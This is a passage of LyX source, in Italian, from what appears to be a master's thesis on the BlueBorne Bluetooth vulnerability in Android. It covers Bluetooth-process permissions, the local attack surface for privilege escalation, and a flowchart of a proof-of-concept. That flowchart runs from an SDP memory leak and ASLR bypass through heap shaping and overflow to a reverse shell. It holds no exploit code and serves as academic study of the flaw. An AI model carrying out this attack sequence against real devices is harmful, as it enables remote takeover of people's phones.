\begin_layout Plain Layout

android.permission.SEND_SMS
\end_layout

\begin_layout Plain Layout

# Permette di scrivere direttamente sul
\end_layout

\begin_layout Plain Layout

# Content Provider Bluetooth
\end_layout

\begin_layout Plain Layout

android.permission.ACCESS_BLUETOOTH_SHARE
\end_layout

\begin_layout Plain Layout

# Permette di accedere alla configurazione Bluetooth
\end_layout

\begin_layout Plain Layout

# del dispositivo e di fare e accettare connessioni
\end_layout

\begin_layout Plain Layout

android.permission.BLUETOOTH
\end_layout

\begin_layout Plain Layout

# Permette di configurare il dispositivo Bluetooth
\end_layout

\begin_layout Plain Layout

# eseguire scansioni per trovare dispositivi Bluetooth
\end_layout

\begin_layout Plain Layout

# vicini e avviare il pairing con questi anche senza
\end_layout

\begin_layout Plain Layout

# interazione con l'utente
\end_layout

\begin_layout Plain Layout

android.permission.BLUETOOTH_ADMIN
\end_layout

\begin_layout Plain Layout

android.permission.BLUETOOTH_MAP
\end_layout

\begin_layout Plain Layout

android.permission.BLUETOOTH_PRIVILEGED
\end_layout

\begin_layout Plain Layout

# Permette allo stack Bluetooth di accedere ai file
\end_layout

\begin_layout Plain Layout

android.permission.BLUETOOTH_STACK
\end_layout

\begin_layout Plain Layout

# Permette di accedere a internet
\end_layout

\begin_layout Plain Layout

android.permission.INTERNET
\end_layout

\begin_layout Plain Layout

# Permette di leggere e modificare lo stato della rete
\end_layout

\begin_layout Plain Layout

android.permission.ACCESS_NETWORK_STATE
\end_layout

\begin_layout Plain Layout

android.permission.CHANGE_NETWORK_STATE
\end_layout

\begin_layout Plain Layout

# Permette l'accesso alla configurazione delle
\end_layout

\begin_layout Plain Layout

# interfacce di rete e la configurazione e l'uso di
\end_layout

\begin_layout Plain Layout

# IPSec, ecc.
\end_layout

\begin_layout Plain Layout

android.permission.NET_ADMIN
\end_layout

\begin_layout Plain Layout

# Permette l'accesso a basso livello al driver dei tap
\end_layout

\begin_layout Plain Layout

android.permission.NET_TUNNELING
\end_layout

\begin_layout Plain Layout

# Permette di gestire il tethering del dispositivo senza
\end_layout

\begin_layout Plain Layout

# interazione con l'utente
\end_layout

\begin_layout Plain Layout

android.permission.TETHER_PRIVILEGED
\end_layout

\begin_layout Plain Layout

# Permette di utilizzare le API privilegiate del
\end_layout

\begin_layout Plain Layout

# ConnectivityManager
\end_layout

\begin_layout Plain Layout

android.permission.CONNECTIVITY_INTERNAL
\end_layout

\begin_layout Plain Layout

# Permette di chiamare qualunque numero, anche se di
\end_layout

\begin_layout Plain Layout

# emergenza, senza che compaia il dialer per chiedere
\end_layout

\begin_layout Plain Layout

# conferma all'utente
\end_layout

\begin_layout Plain Layout

android.permission.CALL_PRIVILEGED
\end_layout

\begin_layout Plain Layout

# Permette di ottenere i dump delle informazioni
\end_layout

\begin_layout Plain Layout

# dai servizi di sistema
\end_layout

\begin_layout Plain Layout

android.permission.DUMP
\end_layout

\begin_layout Plain Layout

# Permette di sapere se ci sono contenuti audio/video
\end_layout

\begin_layout Plain Layout

# in esecuzione e di controllarli
\end_layout

\begin_layout Plain Layout

android.permission.MEDIA_CONTENT_CONTROL
\end_layout

\begin_layout Plain Layout

# Permette di modificare il routing dell'audio
\end_layout

\begin_layout Plain Layout

android.permission.MODIFY_AUDIO_ROUTING
\end_layout

\begin_layout Plain Layout

# Permette di modificare le impostazioni globali
\end_layout

\begin_layout Plain Layout

# dell'audio
\end_layout

\begin_layout Plain Layout

android.permission.MODIFY_AUDIO_SETTINGS
\end_layout

\begin_layout Plain Layout

# Permette di modificare lo stato del telefono
\end_layout

\begin_layout Plain Layout

android.permission.MODIFY_PHONE_STATE
\end_layout

\begin_layout Plain Layout

# Permette di accedere in modo privilegiato allo stato
\end_layout

\begin_layout Plain Layout

# del telefono
\end_layout

\begin_layout Plain Layout

android.permission.READ_PRIVILEGED_PHONE_STATE
\end_layout

\begin_layout Plain Layout

# Permette di inviare e ricevere lo stato di consegna
\end_layout

\begin_layout Plain Layout

# dal Bluetooth e dal WiFi
\end_layout

\begin_layout Plain Layout

android.permission.NFC_HANDOVER_STATUS
\end_layout

\begin_layout Plain Layout

# Permette l'accesso alle informazioni sui task
\end_layout

\begin_layout Plain Layout

android.permission.REAL_GET_TASKS
\end_layout

\begin_layout Plain Layout

# Permette di leggere le vCard dalla lista contatti
\end_layout

\begin_layout Plain Layout

android.permission.READ_PROFILE
\end_layout

\begin_layout Plain Layout

# Permette di sapere quando il dispositivo ha concluso
\end_layout

\begin_layout Plain Layout

# la fase di avvio
\end_layout

\begin_layout Plain Layout

android.permission.RECEIVE_BOOT_COMPLETED
\end_layout

\begin_layout Plain Layout

# Permette di aggiornare le statistiche sulle operazioni
\end_layout

\begin_layout Plain Layout

# delle applicazioni
\end_layout

\begin_layout Plain Layout

android.permission.UPDATE_APP_OPS_STATS
\end_layout

\begin_layout Plain Layout

# Permette di aggiornare le statistiche del dispositivo
\end_layout

\begin_layout Plain Layout

android.permission.UPDATE_DEVICE_STATS
\end_layout

\begin_layout Plain Layout

# Permette di far vibrare il dispositivo
\end_layout

\begin_layout Plain Layout

android.permission.VIBRATE
\end_layout

\begin_layout Plain Layout

# Permette di prevenire lo schermo dallo spegnersi e il
\end_layout

\begin_layout Plain Layout

# processore dall'andare in sleep
\end_layout

\begin_layout Plain Layout

android.permission.WAKE_LOCK
\end_layout

\begin_layout Plain Layout

# Permette l'accesso a basso livello del gestore
\end_layout

\begin_layout Plain Layout

# dell'alimentazione
\end_layout

\begin_layout Plain Layout

android.permission.DEVICE_POWER
\end_layout

\begin_layout Plain Layout

# Permette di scrivere le impostazioni APN
\end_layout

\begin_layout Plain Layout

android.permission.WRITE_APN_SETTINGS
\end_layout

\begin_layout Plain Layout

# Permette di leggere e scrivere le impostazioni di sistema
\end_layout

\begin_layout Plain Layout

# comprese quelle di sicurezza
\end_layout

\begin_layout Plain Layout

android.permission.WRITE_SETTINGS
\end_layout

\begin_layout Plain Layout

android.permission.WRITE_SECURE_SETTINGS
\end_layout

\begin_layout Plain Layout

# Permette l'accesso ai contenuti multimediali presenti sul
\end_layout

\begin_layout Plain Layout

# cloud sul proprio account Google Photo
\end_layout

\begin_layout Plain Layout

com.android.gallery3d.permission.GALLERY_PROVIDER
\end_layout

\begin_layout Plain Layout

com.google.android.gallery3d.permission.GALLERY_PROVIDER
\end_layout

\end_inset


\end_layout

\begin_layout Subsection
Superficie di attacco locale
\end_layout

\begin_layout Standard
Quando un attaccante ha ottenuto esecuzione di codice arbitrario su un dispositi
vo, il passo successivo è ovviamente la 
\emph on
privilege escalation
\emph default

\begin_inset Foot
status collapsed

\begin_layout Plain Layout
Atto di aumentare i privilegi dell'utente corrente tramite vulnerabilità
 locali o errori di configurazione
\end_layout

\end_inset

.
 L'obiettivo finale è quello di eseguire del codice in 
\emph on
kernel space
\emph default
 o come utente 
\emph on
root
\emph default
/
\emph on
system
\emph default
 così da non avere limitazioni sulle operazioni che si possono compiere.
\end_layout

\begin_layout Standard
Nel nostro caso la superficie di attacco è piuttosto ampia, ma bisogna che
 venga analizzata con cura per capire come sfruttarla.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
Il retaggio Unix di Android porta all'esposizione di una vasta superficie
 di attacco attraverso diverse 
\emph on
entry
\emph default
 nel file system: 
\emph on
endpoint
\emph default
 sia in 
\emph on
kernel space 
\emph default
che in 
\emph on
user space
\emph default
.
 Lato 
\emph on
kernel 
\emph default
ci sono i driver dei dispositivi e i 
\emph on
file system
\emph default
 virtuali, lato utente molte componenti, come servizi privilegiati, espongono
 funzionalità di 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

IPC
\end_layout

\end_inset

 tramite socket della famiglia 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

PF_UNIX
\end_layout

\end_inset

.
 Oltre questi, anche file e cartelle normali con permessi troppo lascivi
 danno la possibilità di aumentare la superficie di attacco, quindi le probabili
tà di successo.
\end_layout

\begin_layout Standard
Semplicemente esaminando il 
\emph on
file system
\emph default
, manualmente o in modo automatico, è possibile trovare questi possibili
 punti d'ingresso per proseguire con la successiva fase di analisi ed eventualme
nte 
\emph on
exploitation
\emph default
.
\end_layout

\begin_layout Standard
Ogni 
\emph on
entry
\emph default
 nel 
\emph on
file system
\emph default
 ha differenti proprietà.
 Prima e più importante è l'appartenenza a uno specifico utente/gruppo;
 in secondo luogo i permessi che l'utente o il gruppo hanno rispetto alla
 
\emph on
entry
\emph default
.
 Questi permessi specificano chi tra proprietario, gruppo e resto del mondo
 può eseguire lettura, scrittura ed esecuzione sulla 
\emph on
entry
\emph default
 in questione.
 Sono presenti inoltre permessi speciali come ad esempio il 
\emph on
set-user-id
\emph default
 (o SETUID) che permettono a chiunque di eseguire un programma elevando
 temporaneamente i propri privilegi a quelli del proprietario del file.
\end_layout

\begin_layout Standard
È importante considerare queste e molte altre proprietà nella determinazione
 dell'esatta superificie di attacco raggiungibile dato un particolare livello
 di accesso.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
È possibile che un utente non privilegiato possa accedere a un file che
 però si trova in una cartella di cui gli è impossibile mostrare il contenuto.
 In questa situazione è possibile non avere una visione completa della superfici
e d'attacco a disposizione.
 Avendo a disposizione la possibilità di elevare i nostri privilegi a quelli
 di 
\emph on
root
\emph default
 su un dispositivo di test (uguale a quello vittima) possiamo investigare
 a fondo il file system senza restrizione alla ricerca di 
\emph on
entry
\emph default
 che siano di interesse durante una reale fase di 
\emph on
post-exploitation
\emph default
.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
Non tutta la superficie d'attacco è esposta tramite il 
\emph on
file system
\emph default
.
 Altre superfici d'attacco esposte dal kernel Linux includono le chiamate
 di sistema, l'implementazione dei 
\emph on
socket
\emph default
, porzioni di memoria condivisa, ecc.
 C'è poi da considerare la parte più strettamente legata all'hardware e
 ai servizi che permettono di dialogarci.
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
Una trattazione completa sulla fase di 
\emph on
post-exploitation
\emph default
, tuttavia, va oltre lo scopo di questo testo, perciò non verrà ulteriormente
 approfondita.
\end_layout

\begin_layout Section
Workflow del Proof of Concept (PoC)
\end_layout

\begin_layout Standard
Supponiamo che in qualche modo abbiamo ottenuto il BDADDR del dispositivo
 vittima, che abbiamo calcolato la posizione in memoria di indirizzi validi
 da sfruttare per bypassare l'ASLR, e che ci troviamo in prossimità fisica
 del dispositivo da attaccare.
 Date queste premesse e quanto detto nelle sezioni precedenti un attacco
 d'esempio si presenta come in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:blueborne-demo"

\end_inset

.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement h
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/blueborne-demo.png
	display false
	width 100col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:blueborne-demo"

\end_inset

Schema esemplificativo dell'attacco BlueBorne
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Riepilogando, quello che vogliamo fare come attaccanti è collegarci tramite
 Bluetooth e, sfruttando le vulnerabilità descritte, aprire una connessione
 TCP/IP verso una macchina sotto il nostro controllo per poter lanciare
 comandi 
\emph on
bash
\emph default
 al dispositivo vittima.
\end_layout

\begin_layout Standard
La figura 
\begin_inset CommandInset ref
LatexCommand ref
reference "fig:blueborne-demo"

\end_inset

 è chiara, ma semplifica eccessivamente il processo di attacco.
 Il workflow dettagliato del PoC di un attacco che sfrutta BlueBorne utilizzando
 quanto detto finora è quello mostrato a seguire in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:poc-workflow"

\end_inset

.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement h
wide false
sideways false
status open

\begin_layout Plain Layout
\noindent
\align center
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
tikzset{>={Latex[width=2mm,length=2mm]},
\end_layout

\begin_layout Plain Layout

	% Specifications for style of nodes:
\end_layout

\begin_layout Plain Layout

	base/.style = {rectangle, rounded corners, draw=black,
\end_layout

\begin_layout Plain Layout

	               minimum width=4cm, minimum height=1cm,
\end_layout

\begin_layout Plain Layout

	               text centered, font=
\backslash
sffamily},
\end_layout

\begin_layout Plain Layout

	blueProcess/.style = {base, fill=blue!15},
\end_layout

\begin_layout Plain Layout

	redProcess/.style = {base, fill=red!15},
\end_layout

\begin_layout Plain Layout

	greenProcess/.style = {base, fill=green!15},
\end_layout

\begin_layout Plain Layout

	process/.style = {base, minimum width=2.5cm, fill=orange!15,
\end_layout

\begin_layout Plain Layout

	               font=
\backslash
ttfamily
\backslash
small},
\end_layout

\begin_layout Plain Layout

}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{tikzpicture}[node distance=1.4cm,
\end_layout

\begin_layout Plain Layout

    every node/.style={fill=white, font=
\backslash
sffamily
\backslash
small}, align=center, text width=5cm]
\end_layout

\begin_layout Plain Layout

	% Specification of nodes (position, etc.)
\end_layout

\begin_layout Plain Layout

	
\backslash
node (socketsForConnectback) [greenProcess, text width=6cm] {Creazione socket
 per reverse shell};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (establishSdpConnection) [blueProcess, below of=socketsForConnectback]
 {Creazione connessione SDP con 
\backslash
(
\backslash
text{MTU}=48
\backslash
)};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (sendSdpReq) [process, below of=establishSdpConnection] {Invio SDP
\backslash
_SERVICE
\backslash
_SEARCH
\backslash
_REQ per 
\backslash
(
\backslash
text{UUID}=
\backslash
text{L2CAP}
\backslash
)};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (receiveSdpRsp) [process, below of=sendSdpReq, yshift=-0.1cm] {Ricezione
 SDP
\backslash
_SERVICE
\backslash
_SEARCH
\backslash
_RSP con continuation state};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (sendSdpMaliciousReq) [process, below of=receiveSdpRsp, yshift=-0.3cm]
 {Invio SDP
\backslash
_SERVICE
\backslash
_SEARCH
\backslash
_REQ 
\backslash

\backslash
 per 
\backslash
(
\backslash
text{UUID}=
\backslash
text{ATT}
\backslash
) con continuation state ricevuto};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (closeConnection) [blueProcess, below of=sendSdpMaliciousReq] {Chiusura
 connessione};
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
node (getLeakedLibcAddr) [process, below of=closeConnection, xshift=-3cm]
 {Preleva indirizzo di libc.so da posizione nota nel dump};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (libcBaseAddr) [process, below of=getLeakedLibcAddr] {Calcolo indirizzo
 base libc.so};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (systemAddr) [greenProcess, below of=libcBaseAddr] {Calcolo indirizzo
 funzione system};
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
node (getLeakedBluetoothAddr) [process, below of=closeConnection, xshift=3cm]
 {Preleva indirizzo di bluetooth.default.so da posizione nota nel dump};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (bluetoothBaseAddr) [process, below of=getLeakedBluetoothAddr] {Calcolo
 indirizzo base bluetooth.default.so};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (payloadAddr) [greenProcess, below of=bluetoothBaseAddr] {Calcolo indirizzo
 payload};
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
node (aslrBypassed) [redProcess, below of=payloadAddr, xshift=-3cm, text
 width=8.5cm] {ASLR bypassato};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (buildPayload) [greenProcess, below of=aslrBypassed, text width=8.5cm]
 {Costruisci payload e imposta come nome controller};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (heapShaping) [process, below of=buildPayload, text width=8.5cm] {Invia
 pacchetti per heap shaping 
\backslash

\backslash
 
\backslash
scriptsize (Ripetere più volte)};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (sendOverflow) [process, below of=heapShaping, text width=8.5cm] {Invia
 pacchetti che inducono overflow 
\backslash

\backslash
 
\backslash
scriptsize (con indirizzo del payload)};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (checkConnectback) [blueProcess, below of=sendOverflow, text width=8.5cm]
 {Controllo connessione reverse shell};
\end_layout

\begin_layout Plain Layout

	
\backslash
node (postExploitation) [greenProcess, below of=checkConnectback, text width=8.5c
m] {Post-Exploitation};
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	% Specification of lines between nodes specified above
\end_layout

\begin_layout Plain Layout

	% with aditional nodes for description 
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (socketsForConnectback) -- (establishSdpConnection);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (establishSdpConnection) -- (sendSdpReq);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (sendSdpReq) -- (receiveSdpRsp);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (receiveSdpRsp) -- (sendSdpMaliciousReq);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (sendSdpMaliciousReq.west) -- ++(-2.4,0) -- ++(0,1.7) -- ++(0,0) --
\end_layout

\begin_layout Plain Layout

	 node[xshift=-0.8cm,yshift=-0.9cm, text width=3.6cm]
\end_layout

\begin_layout Plain Layout

	 {Ripetere fino a ottenere il dump della dimensione voluta}(receiveSdpRsp.west);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (sendSdpMaliciousReq) -- (closeConnection);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (closeConnection) --  (getLeakedLibcAddr);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (getLeakedLibcAddr) --  (libcBaseAddr);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (libcBaseAddr) --  (systemAddr);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (closeConnection) -- (getLeakedBluetoothAddr);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (getLeakedBluetoothAddr) --  (bluetoothBaseAddr);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (bluetoothBaseAddr) --  (payloadAddr);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (systemAddr) --  (aslrBypassed);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (payloadAddr) --  (aslrBypassed);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (aslrBypassed) --  (buildPayload);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (buildPayload) --  (heapShaping);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (heapShaping) --  (sendOverflow);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (sendOverflow.west) -- ++(-2,0) -- ++(0,15.8) -- ++(0,0) --
\end_layout

\begin_layout Plain Layout

	 node[xshift=-1.5cm, yshift=-2cm, text width=4.2cm]
\end_layout

\begin_layout Plain Layout

	 {Ricominciare in caso di crash del demone Bluetooth}(establishSdpConnection.wes
t);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (sendOverflow) --  (checkConnectback);
\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (checkConnectback.east) -- ++(2,0) -- ++(0,17.2) -- ++(0,0) --
\end_layout

\begin_layout Plain Layout

	 node[xshift=0.9cm, yshift=-3cm, text width=3cm]
\end_layout

\begin_layout Plain Layout

	 {Ricominciare in caso di errore di connessione}(establishSdpConnection.east);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
draw[->] (checkConnectback) --  (postExploitation);
\end_layout

\begin_layout Plain Layout


\backslash
end{tikzpicture}
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:poc-workflow"

\end_inset

Sequenza di passi da eseguire per completare un attacco utilizzando BlueBorne
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
endgroup
\end_layout

\end_inset


\end_layout

\end_body
\end_document
